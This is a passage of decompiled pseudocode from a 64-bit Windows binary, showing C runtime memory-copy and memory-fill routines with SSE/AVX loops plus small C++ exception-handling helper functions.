      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i32[2] = v18;
      return;
    case 0xDuLL:
      v14 = _RDX->m128i_i32[2];
      v15 = _RDX->m128i_i8[12];
      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i32[2] = v14;
      _RAX->m128i_i8[12] = v15;
      return;
    case 0xEuLL:
      v11 = _RDX->m128i_i32[2];
      v12 = _RDX->m128i_i16[6];
      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i32[2] = v11;
      _RAX->m128i_i16[6] = v12;
      return;
    case 0xFuLL:
      v4 = _RDX->m128i_i32[2];
      v5 = _RDX->m128i_i16[6];
      v6 = _RDX->m128i_i8[14];
      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];
      _RAX->m128i_i32[2] = v4;
      _RAX->m128i_i16[6] = v5;
      _RAX->m128i_i8[14] = v6;
      return;
    default:
      if ( _R8 <= 0x20 )
      {
        v21 = _mm_loadu_si128((const __m128i *)((char *)_RDX + _R8 - 16));
        *_RCX = _mm_loadu_si128(_RDX);
        *(__m128i *)((char *)_RCX + _R8 - 16) = v21;
        return;
      }
      v22 = (__m128i *)((char *)_RDX + _R8);
      if ( _RCX <= _RDX )
        v22 = _RCX;
      if ( _RCX < v22 )
      {
        v69 = *_RDX;
        v70 = (char *)_RDX - (char *)_RCX;
        v71 = &_RCX->m128i_i8[_R8];
        v72 = *(_OWORD *)&v71[v70 - 16];
        v73 = (unsigned __int64)(v71 - 16);
        v74 = _R8 - 16;
        if ( (v73 & 0xF) != 0 )
        {
          v75 = (_OWORD *)v73;
          v73 &= 0xFFFFFFFFFFFFFFF0uLL;
          v76 = v72;
          v72 = *(_OWORD *)(v73 + v70);
          *v75 = v76;
          v74 = v73 - (_QWORD)_RAX;
        }
        v77 = v74 >> 7;
        if ( v74 >> 7 != 0 )
        {
          for ( *(_OWORD *)v73 = v72; ; *(_OWORD *)v73 = v83 )
          {
            v78 = *(_OWORD *)(v73 + v70 - 16);
            v79 = *(_OWORD *)(v73 + v70 - 32);
            v73 -= 128LL;
            *(_OWORD *)(v73 + 112) = v78;
            *(_OWORD *)(v73 + 96) = v79;
            v80 = *(_OWORD *)(v73 + v70 + 64);
            --v77;
            *(_OWORD *)(v73 + 80) = *(_OWORD *)(v73 + v70 + 80);
            *(_OWORD *)(v73 + 64) = v80;
            v81 = *(_OWORD *)(v73 + v70 + 32);
            *(_OWORD *)(v73 + 48) = *(_OWORD *)(v73 + v70 + 48);
            *(_OWORD *)(v73 + 32) = v81;
            v82 = *(_OWORD *)(v73 + v70 + 16);
            v83 = *(_OWORD *)(v73 + v70);
            if ( v77 == 0 )
              break;
            *(_OWORD *)(v73 + 16) = v82;
          }
          *(_OWORD *)(v73 + 16) = v82;
          v74 &= 0x7Fu;
          v72 = v83;
        }
        for ( i = v74 >> 4; i != 0; --i )
        {
          *(_OWORD *)v73 = v72;
          v73 -= 16LL;
          v72 = *(_OWORD *)(v73 + v70);
        }
        if ( (v74 & 0xF) != 0 )
          *_RAX = v69;
        *(_OWORD *)v73 = v72;
        return;
      }
      if ( (unsigned int)dword_140026610 < 3 )
      {
        if ( _R8 <= 0x800 || (byte_1400273F0 & 2) == 0 )
        {
          v59 = _mm_loadu_si128(_RDX);
          v60 = _mm_loadu_si128((const __m128i *)((char *)_RDX + _R8 - 16));
          if ( _R8 > 0x80 )
          {
            v61 = ((unsigned __int8)_RCX & 0xF) - 16LL;
            _RCX = (__m128i *)((char *)_RCX - v61);
            _RDX = (const __m128i *)((char *)_RDX - v61);
            _R8 += v61;
            if ( _R8 > 0x80 )
            {
              do
              {
                v62 = _mm_loadu_si128(_RDX + 1);
                v63 = _mm_loadu_si128(_RDX + 2);
                v64 = _mm_loadu_si128(_RDX + 3);
                *_RCX = _mm_loadu_si128(_RDX);
                _RCX[1] = v62;
                _RCX[2] = v63;
                _RCX[3] = v64;
                v65 = _mm_loadu_si128(_RDX + 5);
                v66 = _mm_loadu_si128(_RDX + 6);
                v67 = _mm_loadu_si128(_RDX + 7);
                _RCX[4] = _mm_loadu_si128(_RDX + 4);
                _RCX[5] = v65;
                _RCX[6] = v66;
                _RCX[7] = v67;
                _RCX += 8;
                _RDX += 8;
                _R8 -= 128LL;
              }
              while ( _R8 >= 0x80 );
            }
          }
          v68 = (_R8 + 15) & 0xFFFFFFFFFFFFFFF0uLL;
          switch ( v68 >> 4 )
          {
            case 0uLL:
              goto LABEL_68;
            case 1uLL:
              goto LABEL_67;
            case 2uLL:
              goto LABEL_66;
            case 3uLL:
              goto LABEL_65;
            case 4uLL:
              goto LABEL_64;
            case 5uLL:
              goto LABEL_63;
            case 6uLL:
              goto LABEL_62;
            case 7uLL:
              goto LABEL_61;
            case 8uLL:
              *(__m128i *)((char *)_RCX + v68 - 128) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 128));
LABEL_61:
              *(__m128i *)((char *)_RCX + v68 - 112) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 112));
LABEL_62:
              *(__m128i *)((char *)_RCX + v68 - 96) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 96));
LABEL_63:
              *(__m128i *)((char *)_RCX + v68 - 80) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 80));
LABEL_64:
              *(__m128i *)((char *)_RCX + v68 - 64) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 64));
LABEL_65:
              *(__m128i *)((char *)_RCX + v68 - 48) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 48));
LABEL_66:
              *(__m128i *)((char *)_RCX + v68 - 32) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v68 - 32));
LABEL_67:
              *(__m128i *)((char *)_RCX + _R8 - 16) = v60;
LABEL_68:
              *_RAX = v59;
              break;
          }
          return;
        }
LABEL_81:
        sub_140022A00(_RCX, _RDX, _R8);
        return;
      }
      if ( _R8 > 0x2000 && _R8 <= 0x180000 )
      {
        v23 = _RCX + 4;
        if ( _RCX > _RDX )
          v23 = _RDX;
        if ( v23 <= _RDX && (byte_1400273F0 & 2) != 0 )
          goto LABEL_81;
      }
      __asm
      {
        vmovdqu ymm0, ymmword ptr [rdx]
        vmovdqu ymm5, ymmword ptr [rdx+r8-20h]
      }
      if ( _R8 <= 0x100
        || (v26 = ((unsigned __int8)_RCX & 0x1F) - 32LL,
            _RCX = (__m128i *)((char *)_RCX - v26),
            _RDX = (const __m128i *)((char *)_RDX - v26),
            _R8 += v26,
            _R8 <= 0x100) )
      {
LABEL_33:
        _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;
        switch ( _R9 >> 5 )
        {
          case 0uLL:
            goto LABEL_42;
          case 1uLL:
            goto LABEL_41;
          case 2uLL:
            goto LABEL_40;
          case 3uLL:
            goto LABEL_39;
          case 4uLL:
            goto LABEL_38;
          case 5uLL:
            goto LABEL_37;
          case 6uLL:
            goto LABEL_36;
          case 7uLL:
            goto LABEL_35;
          case 8uLL:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-100h]; jumptable 0000000140022C92 case 8
              vmovdqu ymmword ptr [rcx+r9-100h], ymm1
            }
LABEL_35:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-0E0h]; jumptable 0000000140022C92 case 7
              vmovdqu ymmword ptr [rcx+r9-0E0h], ymm1
            }
LABEL_36:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-0C0h]; jumptable 0000000140022C92 case 6
              vmovdqu ymmword ptr [rcx+r9-0C0h], ymm1
            }
LABEL_37:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-0A0h]; jumptable 0000000140022C92 case 5
              vmovdqu ymmword ptr [rcx+r9-0A0h], ymm1
            }
LABEL_38:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-80h]; jumptable 0000000140022C92 case 4
              vmovdqu ymmword ptr [rcx+r9-80h], ymm1
            }
LABEL_39:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-60h]; jumptable 0000000140022C92 case 3
              vmovdqu ymmword ptr [rcx+r9-60h], ymm1
            }
LABEL_40:
            __asm
            {
              vmovdqu ymm1, ymmword ptr [rdx+r9-40h]; jumptable 0000000140022C92 case 2
              vmovdqu ymmword ptr [rcx+r9-40h], ymm1
            }
LABEL_41:
            __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm5; jumptable 0000000140022C92 case 1 }
LABEL_42:
            __asm
            {
              vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000140022C92 case 0
              vzeroupper
            }
            break;
        }
        return;
      }
      if ( _R8 <= 0x180000 )
      {
        do
        {
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx]
            vmovdqu ymm2, ymmword ptr [rdx+20h]
            vmovdqu ymm3, ymmword ptr [rdx+40h]
            vmovdqu ymm4, ymmword ptr [rdx+60h]
            vmovdqa ymmword ptr [rcx], ymm1
            vmovdqa ymmword ptr [rcx+20h], ymm2
            vmovdqa ymmword ptr [rcx+40h], ymm3
            vmovdqa ymmword ptr [rcx+60h], ymm4
            vmovdqu ymm1, ymmword ptr [rdx+80h]
            vmovdqu ymm2, ymmword ptr [rdx+0A0h]
            vmovdqu ymm3, ymmword ptr [rdx+0C0h]
            vmovdqu ymm4, ymmword ptr [rdx+0E0h]
            vmovdqa ymmword ptr [rcx+80h], ymm1
            vmovdqa ymmword ptr [rcx+0A0h], ymm2
            vmovdqa ymmword ptr [rcx+0C0h], ymm3
            vmovdqa ymmword ptr [rcx+0E0h], ymm4
          }
          _RCX += 16;
          _RDX += 16;
          _R8 -= 256LL;
        }
        while ( _R8 >= 0x100 );
        goto LABEL_33;
      }
      do
      {
        __asm
        {
          vmovdqu ymm1, ymmword ptr [rdx]
          vmovdqu ymm2, ymmword ptr [rdx+20h]
          vmovdqu ymm3, ymmword ptr [rdx+40h]
          vmovdqu ymm4, ymmword ptr [rdx+60h]
          vmovntdq ymmword ptr [rcx], ymm1
          vmovntdq ymmword ptr [rcx+20h], ymm2
          vmovntdq ymmword ptr [rcx+40h], ymm3
          vmovntdq ymmword ptr [rcx+60h], ymm4
          vmovdqu ymm1, ymmword ptr [rdx+80h]
          vmovdqu ymm2, ymmword ptr [rdx+0A0h]
          vmovdqu ymm3, ymmword ptr [rdx+0C0h]
          vmovdqu ymm4, ymmword ptr [rdx+0E0h]
          vmovntdq ymmword ptr [rcx+80h], ymm1
          vmovntdq ymmword ptr [rcx+0A0h], ymm2
          vmovntdq ymmword ptr [rcx+0C0h], ymm3
          vmovntdq ymmword ptr [rcx+0E0h], ymm4
        }
        _RCX += 16;
        _RDX += 16;
        _R8 -= 256LL;
      }
      while ( _R8 >= 0x100 );
      _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;
      switch ( _R9 >> 5 )
      {
        case 0uLL:
          goto LABEL_53;
        case 1uLL:
          goto LABEL_52;
        case 2uLL:
          goto LABEL_51;
        case 3uLL:
          goto LABEL_50;
        case 4uLL:
          goto LABEL_49;
        case 5uLL:
          goto LABEL_48;
        case 6uLL:
          goto LABEL_47;
        case 7uLL:
          goto LABEL_46;
        case 8uLL:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-100h]; jumptable 0000000140022DC2 case 8
            vmovntdq ymmword ptr [rcx+r9-100h], ymm1
          }
LABEL_46:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-0E0h]; jumptable 0000000140022DC2 case 7
            vmovntdq ymmword ptr [rcx+r9-0E0h], ymm1
          }
LABEL_47:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-0C0h]; jumptable 0000000140022DC2 case 6
            vmovntdq ymmword ptr [rcx+r9-0C0h], ymm1
          }
LABEL_48:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-0A0h]; jumptable 0000000140022DC2 case 5
            vmovntdq ymmword ptr [rcx+r9-0A0h], ymm1
          }
LABEL_49:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-80h]; jumptable 0000000140022DC2 case 4
            vmovntdq ymmword ptr [rcx+r9-80h], ymm1
          }
LABEL_50:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-60h]; jumptable 0000000140022DC2 case 3
            vmovntdq ymmword ptr [rcx+r9-60h], ymm1
          }
LABEL_51:
          __asm
          {
            vmovdqu ymm1, ymmword ptr [rdx+r9-40h]; jumptable 0000000140022DC2 case 2
            vmovntdq ymmword ptr [rcx+r9-40h], ymm1
          }
LABEL_52:
          __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm5; jumptable 0000000140022DC2 case 1 }
LABEL_53:
          __asm { vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000140022DC2 case 0 }
          _mm_sfence();
          __asm { vzeroupper }
          break;
      }
      return;
  }
}


// ----- sub_1400230B0 @ 0x1400230b0 -----
__int64 __fastcall sub_1400230B0(void *a1, char a2, unsigned __int64 a3, __int64 a4)
{
  memset(a1, a2, a3);
  return a4;
}


// ----- sub_1400230C0 @ 0x1400230c0 -----
__m128i *__fastcall sub_1400230C0(__int64 a1, unsigned __int8 a2, unsigned __int64 a3)
{
  __m128i *result; // rax
  __int64 v6; // r11
  unsigned __int64 v8; // rcx
  __m128i v9; // xmm0
  __int64 v11; // r9
  __int64 v16; // r9
  __m128i *v17; // rcx
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9

  result = (__m128i *)a1;
  v6 = 0x101010101010101LL * a2;
  v8 = a3 + a1;
  switch ( a3 )
  {
    case 0uLL:
      return result;
    case 1uLL:
      goto LABEL_5;
    case 2uLL:
      goto LABEL_8;
    case 3uLL:
      goto LABEL_4;
    case 4uLL:
      goto LABEL_12;
    case 5uLL:
      goto LABEL_10;
    case 6uLL:
      goto LABEL_7;
    case 7uLL:
      goto LABEL_3;
    case 8uLL:
      *(_QWORD *)(v8 - 8) = v6;
      return result;
    case 9uLL:
      *(_QWORD *)(v8 - 9) = v6;
      *(_BYTE *)(v8 - 1) = a2;
      return result;
    case 0xAuLL:
      *(_QWORD *)(v8 - 10) = v6;
      *(_WORD *)(v8 - 2) = v6;
      return result;
    case 0xBuLL:
      *(_QWORD *)(v8 - 11) = v6;
      *(_WORD *)(v8 - 3) = v6;
      *(_BYTE *)(v8 - 1) = a2;
      return result;
    case 0xCuLL:
      *(_QWORD *)(v8 - 12) = v6;
LABEL_12:
      *(_DWORD *)(v8 - 4) = v6;
      return result;
    case 0xDuLL:
      *(_QWORD *)(v8 - 13) = v6;
LABEL_10:
      *(_DWORD *)(v8 - 5) = v6;
      *(_BYTE *)(v8 - 1) = a2;
      return result;
    case 0xEuLL:
      *(_QWORD *)(v8 - 14) = v6;
LABEL_7:
      *(_DWORD *)(v8 - 6) = v6;
LABEL_8:
      *(_WORD *)(v8 - 2) = v6;
      return result;
    case 0xFuLL:
      *(_QWORD *)(v8 - 15) = v6;
LABEL_3:
      *(_DWORD *)(v8 - 7) = v6;
LABEL_4:
      *(_WORD *)(v8 - 3) = v6;
LABEL_5:
      *(_BYTE *)(v8 - 1) = a2;
      return result;
    default:
      v9 = _mm_unpacklo_epi64((__m128i)(unsigned __int64)v6, (__m128i)(unsigned __int64)v6);
      if ( a3 <= 0x20 )
      {
        *(__m128i *)a1 = v9;
        *(__m128i *)(a1 + a3 - 16) = v9;
        return result;
      }
      if ( (unsigned int)dword_140026610 < 3 )
      {
        if ( a3 <= qword_140026618 || (byte_1400273F0 & 2) == 0 )
        {
          v16 = (a1 & 0xF) - 16;
          v17 = (__m128i *)(a1 - v16);
          v18 = v16 + a3;
          if ( v18 > 0x80 )
          {
            do
            {
              *v17 = v9;
              v17[1] = v9;
              v17[2] = v9;
              v17[3] = v9;
              v17[4] = v9;
              v17[5] = v9;
              v17[6] = v9;
              v17[7] = v9;
              v17 += 8;
              v18 -= 128LL;
            }
            while ( v18 >= 0x80 );
          }
          v19 = (v18 + 15) & 0xFFFFFFFFFFFFFFF0uLL;
          switch ( v19 >> 4 )
          {
            case 0uLL:
              goto LABEL_60;
            case 1uLL:
              goto LABEL_59;
            case 2uLL:
              goto LABEL_58;
            case 3uLL:
              goto LABEL_57;
            case 4uLL:
              goto LABEL_56;
            case 5uLL:
              goto LABEL_55;
            case 6uLL:
              goto LABEL_54;
            case 7uLL:
              goto LABEL_53;
            case 8uLL:
              *(__m128i *)((char *)v17 + v19 - 128) = v9;
LABEL_53:
              *(__m128i *)((char *)v17 + v19 - 112) = v9;
LABEL_54:
              *(__m128i *)((char *)v17 + v19 - 96) = v9;
LABEL_55:
              *(__m128i *)((char *)v17 + v19 - 80) = v9;
LABEL_56:
              *(__m128i *)((char *)v17 + v19 - 64) = v9;
LABEL_57:
              *(__m128i *)((char *)v17 + v19 - 48) = v9;
LABEL_58:
              *(__m128i *)((char *)v17 + v19 - 32) = v9;
LABEL_59:
              *(__m128i *)((char *)v17 + v18 - 16) = v9;
LABEL_60:
              *result = v9;
              break;
          }
          return result;
        }
        return (__m128i *)sub_1400230B0((void *)a1, a2, a3, a1);
      }
      if ( a3 > qword_140026618 && a3 <= qword_140026620 && (byte_1400273F0 & 2) != 0 )
        return (__m128i *)sub_1400230B0((void *)a1, a2, a3, a1);
      __asm { vinsertf128 ymm0, ymm0, xmm0, 1 }
      v11 = (a1 & 0x1F) - 32;
      _RCX = a1 - v11;
      _R8 = v11 + a3;
      if ( _R8 <= 0x100 )
        goto LABEL_26;
      if ( _R8 <= qword_140026620 )
      {
        do
        {
          __asm
          {
            vmovdqa ymmword ptr [rcx], ymm0
            vmovdqa ymmword ptr [rcx+20h], ymm0
            vmovdqa ymmword ptr [rcx+40h], ymm0
            vmovdqa ymmword ptr [rcx+60h], ymm0
            vmovdqa ymmword ptr [rcx+80h], ymm0
            vmovdqa ymmword ptr [rcx+0A0h], ymm0
            vmovdqa ymmword ptr [rcx+0C0h], ymm0
            vmovdqa ymmword ptr [rcx+0E0h], ymm0
          }
          _RCX += 256;
          _R8 -= 256LL;
        }
        while ( _R8 >= 0x100 );
LABEL_26:
        _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;
        switch ( _R9 >> 5 )
        {
          case 0uLL:
            goto LABEL_35;
          case 1uLL:
            goto LABEL_34;
          case 2uLL:
            goto LABEL_33;
          case 3uLL:
            goto LABEL_32;
          case 4uLL:
            goto LABEL_31;
          case 5uLL:
            goto LABEL_30;
          case 6uLL:
            goto LABEL_29;
          case 7uLL:
            goto LABEL_28;
          case 8uLL:
            __asm { vmovdqu ymmword ptr [rcx+r9-100h], ymm0; jumptable 0000000140023254 case 8 }
LABEL_28:
            __asm { vmovdqu ymmword ptr [rcx+r9-0E0h], ymm0; jumptable 0000000140023254 case 7 }
LABEL_29:
            __asm { vmovdqu ymmword ptr [rcx+r9-0C0h], ymm0; jumptable 0000000140023254 case 6 }
LABEL_30:
            __asm { vmovdqu ymmword ptr [rcx+r9-0A0h], ymm0; jumptable 0000000140023254 case 5 }
LABEL_31:
            __asm { vmovdqu ymmword ptr [rcx+r9-80h], ymm0; jumptable 0000000140023254 case 4 }
LABEL_32:
            __asm { vmovdqu ymmword ptr [rcx+r9-60h], ymm0; jumptable 0000000140023254 case 3 }
LABEL_33:
            __asm { vmovdqu ymmword ptr [rcx+r9-40h], ymm0; jumptable 0000000140023254 case 2 }
LABEL_34:
            __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm0; jumptable 0000000140023254 case 1 }
LABEL_35:
            __asm
            {
              vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000140023254 case 0
              vzeroupper
            }
            break;
        }
        return result;
      }
      do
      {
        __asm
        {
          vmovntdq ymmword ptr [rcx], ymm0
          vmovntdq ymmword ptr [rcx+20h], ymm0
          vmovntdq ymmword ptr [rcx+40h], ymm0
          vmovntdq ymmword ptr [rcx+60h], ymm0
          vmovntdq ymmword ptr [rcx+80h], ymm0
          vmovntdq ymmword ptr [rcx+0A0h], ymm0
          vmovntdq ymmword ptr [rcx+0C0h], ymm0
          vmovntdq ymmword ptr [rcx+0E0h], ymm0
        }
        _RCX += 256;
        _R8 -= 256LL;
      }
      while ( _R8 >= 0x100 );
      _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;
      switch ( _R9 >> 5 )
      {
        case 0uLL:
          goto LABEL_46;
        case 1uLL:
          goto LABEL_45;
        case 2uLL:
          goto LABEL_44;
        case 3uLL:
          goto LABEL_43;
        case 4uLL:
          goto LABEL_42;
        case 5uLL:
          goto LABEL_41;
        case 6uLL:
          goto LABEL_40;
        case 7uLL:
          goto LABEL_39;
        case 8uLL:
          __asm { vmovntdq ymmword ptr [rcx+r9-100h], ymm0; jumptable 0000000140023314 case 8 }
LABEL_39:
          __asm { vmovntdq ymmword ptr [rcx+r9-0E0h], ymm0; jumptable 0000000140023314 case 7 }
LABEL_40:
          __asm { vmovntdq ymmword ptr [rcx+r9-0C0h], ymm0; jumptable 0000000140023314 case 6 }
LABEL_41:
          __asm { vmovntdq ymmword ptr [rcx+r9-0A0h], ymm0; jumptable 0000000140023314 case 5 }
LABEL_42:
          __asm { vmovntdq ymmword ptr [rcx+r9-80h], ymm0; jumptable 0000000140023314 case 4 }
LABEL_43:
          __asm { vmovntdq ymmword ptr [rcx+r9-60h], ymm0; jumptable 0000000140023314 case 3 }
LABEL_44:
          __asm { vmovntdq ymmword ptr [rcx+r9-40h], ymm0; jumptable 0000000140023314 case 2 }
LABEL_45:
          __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm0; jumptable 0000000140023314 case 1 }
LABEL_46:
          __asm { vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000140023314 case 0 }
          _mm_sfence();
          __asm { vzeroupper }
          break;
      }
      return result;
  }
}


// ----- sub_1400234F0 @ 0x1400234f0 -----
void __fastcall sub_1400234F0(__int64 a1, __int64 a2)
{
  sub_14001B390(**(_DWORD **)(a2 + 72));
}


// ----- sub_14002350A @ 0x14002350a -----
void __fastcall sub_14002350A(__int64 a1, __int64 a2)
{
  sub_14001B390(**(_DWORD **)(a2 + 88));
}


// ----- sub_140023524 @ 0x140023524 -----
void sub_140023524()
{
  sub_14001B390(4);
}


// ----- sub_14002353D @ 0x14002353d -----
void __fastcall sub_14002353D(__int64 a1, __int64 a2)
{
  sub_14001B390(**(_DWORD **)(a2 + 104));
}


// ----- sub_140023557 @ 0x140023557 -----
void sub_140023557()
{
  sub_14001B390(5);
}


// ----- sub_140023570 @ 0x140023570 -----
__int64 __fastcall sub_140023570(int **a1, __int64 a2)
{
  int v2; // ecx

  *(_QWORD *)(a2 + 40) = a1;
  v2 = **a1;
  *(_DWORD *)(a2 + 36) = v2;
  *(_DWORD *)(a2 + 32) = v2 == -529697949;
  return *(unsigned int *)(a2 + 32);
}


// ----- sub_14002359D @ 0x14002359d -----
void __fastcall sub_14002359D(__int64 a1, __int64 a2)
{
  if ( *(_BYTE *)(a2 + 112) != 0 )
    sub_14001B390(3);
}


// ----- sub_1400235C0 @ 0x1400235c0 -----
void sub_1400235C0()
{
  sub_14001B390(0);
}


// ----- sub_1400235D6 @ 0x1400235d6 -----
void sub_1400235D6()
{
  sub_14001B390(0);
}


// ----- sub_1400235F0 @ 0x1400235f0 -----
__int64 __fastcall sub_1400235F0(__int64 a1, __int64 a2)
{
  __int64 v3; // rbx

  *(_QWORD *)(a2 + 48) = a1;
  if ( *(_BYTE *)(a2 + 88) != 0 )
  {
    *(_QWORD *)(a2 + 40) = **(_QWORD **)(a2 + 48);
    if ( **(_DWORD **)(a2 + 40) == -529697949
      && *(_DWORD *)(*(_QWORD *)(a2 + 40) + 24LL) == 4
      && (*(_DWORD *)(*(_QWORD *)(a2 + 40) + 32LL) == 429065504
       || *(_DWORD *)(*(_QWORD *)(a2 + 40) + 32LL) == 429065505
       || *(_DWORD *)(*(_QWORD *)(a2 + 40) + 32LL) == 429065506) )
    {
      *((_QWORD *)sub_14001EA90() + 4) = *(_QWORD *)(a2 + 40);
      v3 = *(_QWORD *)(*(_QWORD *)(a2 + 48) + 8LL);
      *((_QWORD *)sub_14001EA90() + 5) = v3;
      sub_14001D9E8();
    }
  }
  *(_DWORD *)(a2 + 32) = 0;
  return *(unsigned int *)(a2 + 32);
}


// ----- sub_140023690 @ 0x140023690 -----
__int64 __fastcall sub_140023690(__int64 a1, __int64 a2)
{
  ULONG64 *v3; // rdi
  ULONG64 v4; // rbx
  __int64 v5; // rbx

  *(_QWORD *)(a2 + 72) = a1;
  *((_QWORD *)sub_14001EA90() + 14) = *(_QWORD *)(a2 + 128);
  v3 = *(ULONG64 **)(a2 + 152);
  v4 = v3[1];
  *((_QWORD *)sub_14001EA90() + 12) = v4;
  v5 = *(_QWORD *)(**(_QWORD **)(a2 + 72) + 56LL);
  *((_QWORD *)sub_14001EA90() + 13) = v5;
  sub_14001FB90(
    **(_QWORD **)(a2 + 72),
    *(__int64 **)(a2 + 136),
    *(_QWORD *)(a2 + 144),
    v3,
    *(_QWORD *)(a2 + 160),
    0,
    0,
    1u);
  *((_QWORD *)sub_14001EA90() + 14) = 0;
  *(_DWORD *)(a2 + 64) = 1;
  *(_DWORD *)(a2 + 68) = 1;
  return *(unsigned int *)(a2 + 68);
}


// ----- sub_140023740 @ 0x140023740 -----
__int64 __fastcall sub_140023740(__int64 *a1, __int64 a2)
{
  return sub_14001FED0(a1, *(_QWORD *)(a2 + 216), (_DWORD *)(a2 + 32));
}


// ----- sub_140023761 @ 0x140023761 -----
_DWORD *__fastcall sub_140023761(__int64 a1, __int64 a2)
{
  __int64 v3; // rbx
  _DWORD *result; // rax

  sub_14001E830(*(_QWORD *)(a2 + 48));
  if ( *(_DWORD *)(a2 + 32) == 0 )
  {
    v3 = *(_QWORD *)(a2 + 216);
    if ( *(_DWORD *)v3 == -529697949
      && *(_DWORD *)(v3 + 24) == 4
      && (*(_DWORD *)(v3 + 32) == 429065504 || *(_DWORD *)(v3 + 32) == 429065505 || *(_DWORD *)(v3 + 32) == 429065506)
      && (unsigned int)sub_14001E180(*(_QWORD *)(v3 + 40)) != 0 )
    {
      sub_14001E100(v3);
    }
  }
  *((_QWORD *)sub_14001EA90() + 4) = *(_QWORD *)(a2 + 112);
  result = sub_14001EA90();
  *((_QWORD *)result + 5) = *(_QWORD *)(a2 + 120);
  return result;
}


// ----- sub_1400237F0 @ 0x1400237f0 -----
__int64 __fastcall sub_1400237F0(int **a1)
{
  return sub_14001E1F0(a1);
}


// ----- sub_140023806 @ 0x140023806 -----
_DWORD *sub_140023806()
{
  _DWORD *result; // rax

  result = sub_14001EA90();
  if ( (int)result[12] > 0 )
  {
    result = sub_14001EA90();
    --result[12];
  }
  return result;
}


// ----- sub_140023829 @ 0x140023829 -----
void sub_140023829()
{
  sub_14001B390(8);
}


// ----- sub_140023842 @ 0x140023842 -----
void __fastcall sub_140023842(__int64 a1, __int64 a2)
{
  sub_140020D30(**(_QWORD **)(a2 + 72));
}


// ----- sub_14002385D @ 0x14002385d -----
void __fastcall sub_14002385D(__int64 a1, __int64 a2)
{
  sub_14001B390(**(_DWORD **)(a2 + 152));
}


// ----- sub_14002387A @ 0x14002387a -----
void __fastcall sub_14002387A(__int64 a1, __int64 a2)
{
  sub_140020D30(*(_QWORD *)(a2 + 64));
}


// ----- sub_140023892 @ 0x140023892 -----
void __fastcall sub_140023892(__int64 a1, __int64 a2)
{
  sub_140021220(**(_DWORD **)(a2 + 72));
}


// ----- sub_1400238AC @ 0x1400238ac -----
void __fastcall sub_1400238AC(__int64 a1, __int64 a2)
{
  sub_140021220(*(_DWORD *)(a2 + 96));
}


// ----- sub_1400238D0 @ 0x1400238d0 -----
_BOOL8 __fastcall sub_1400238D0(_DWORD **a1)
{
  return **a1 == -1073741819;
}


// ----- nullsub_8 @ 0x140024fa0 -----
__int64 nullsub_8()
{
  _BYTE retaddr[16]; // [rsp+0h] [rbp+0h]

  return MK_FP(*(_WORD *)retaddr, *(_QWORD *)retaddr)();
}


